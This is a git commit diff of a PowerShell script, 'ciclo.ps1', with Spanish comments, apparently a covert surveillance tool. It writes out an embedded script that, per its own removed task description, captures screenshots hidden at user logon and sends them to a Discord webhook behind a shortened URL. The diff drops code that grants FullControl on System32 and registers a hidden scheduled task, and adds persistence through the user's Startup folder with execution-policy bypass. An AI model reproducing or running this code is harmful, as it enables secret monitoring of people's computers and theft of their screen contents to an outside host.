fb1a38cf516694b47a88259cd30ed6bbc73187c6
Gerper90 <43889986+Gerper90@users.noreply.github.com>
2024-02-07 03:23:01 -0500

    ciclo.ps1

--- ciclo.ps1
+++ ciclo.ps1
@@ -8,24 +8,6 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
 # Definir la URL del webhook de Discord
 $hookurl = "https://is.gd/xSsigk"  # Reemplaza "URL_DEL_WEBHOOK" con la URL de tu webhook de Discord
 
-# Definir el nombre del directorio y el script
-$directoryName = "C:\Windows\System32\Scripts"
-$scriptName = "sys_report.ps1"
-
-# Crear el directorio si no existe
-if (-not (Test-Path -Path $directoryName)) {
-    New-Item -Path $directoryName -ItemType Directory -Force | Out-Null
-}
-
-# Obtener la ruta completa de System32
-$system32Path = [Environment]::GetFolderPath([Environment+SpecialFolder]::System)
-
-# Forzar los permisos en la carpeta System32
-$system32ACL = Get-Acl -Path $system32Path
-$system32AccessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Administradores", "FullControl", "ContainerInherit, ObjectInherit", "None", "Allow")
-$system32ACL.SetAccessRule($system32AccessRule)
-Set-Acl -Path $system32Path -AclObject $system32ACL
-
 # Definir el contenido del script
 $scriptContent = @"
 `$hookurl = "$hookurl"
@@ -63,13 +45,15 @@ while (`$true) {
 }
 "@
 
-# Guardar el script en el archivo
-$scriptPath = Join-Path -Path $directoryName -ChildPath $scriptName
+# Obtener la ruta de la carpeta de inicio del usuario actual
+$startupFolder = [Environment]::GetFolderPath("Startup")
+
+# Definir la ruta completa del script en la carpeta de inicio
+$scriptPath = Join-Path -Path $startupFolder -ChildPath "sys_report.ps1"
+
+# Guardar el script en la carpeta de inicio del usuario actual
 $scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8 -Force
 
-# Configurar la tarea programada para ejecutar el script al iniciar sesión del usuario
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
-$trigger = New-ScheduledTaskTrigger -AtLogon
-$task = New-ScheduledTask -Action $action -Trigger $trigger -Description "Tarea programada para ejecutar el script de captura de pantalla de manera oculta al iniciar sesión del usuario" -TaskName "SysReportTask"
-Register-ScheduledTask -InputObject $task -Force | Out-Null
-Enable-ScheduledTask -TaskName "SysReportTask" | Out-Null
+# Ejecutar el script automáticamente al iniciar sesión
+# Esto no requerirá permisos adicionales
+Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""
